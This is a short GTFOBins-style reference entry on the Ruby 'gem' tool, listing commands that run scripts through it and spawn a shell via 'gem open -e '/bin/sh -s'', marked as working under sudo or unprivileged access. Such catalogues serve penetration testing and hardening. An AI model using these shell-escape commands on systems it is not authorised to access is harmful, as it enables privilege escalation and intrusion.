---
type: gtfobin
name: gem
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# gem

## inherit

```bash
gem open debug
```
_This requires the name of an installed gem to be provided, e.g., `debug` is usually installed._
**Contexts:** sudo, unprivileged

```bash
gem build /path/to/script.rb
```
**Contexts:** sudo, unprivileged

```bash
gem install --file /path/to/script.rb
```
**Contexts:** sudo, unprivileged

## shell

```bash
gem open -e '/bin/sh -s' debug
```
_This requires the name of an installed gem to be provided, e.g., `debug` is usually installed._
**Contexts:** sudo, unprivileged
